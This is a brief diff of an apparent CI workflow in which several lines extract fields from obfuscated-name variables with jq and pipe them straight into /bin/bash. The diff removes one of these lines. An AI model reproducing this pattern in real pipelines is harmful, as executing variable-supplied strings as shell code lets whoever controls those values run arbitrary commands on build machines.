@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$eyrz64" | jq -r .pcmok388 | /bin/bash
           echo $mdg72 | jq -r .zqd2 | /bin/bash
           printf '%s' "$kurj258" | jq -r .bpn8185 | /bin/bash
-          printf '%s' "$nge89" | jq -r .yp9 | /bin/bash
           printf '%s' "$mdnv762" | jq -r .fn6419 | /bin/bash
 
       - name: Save output
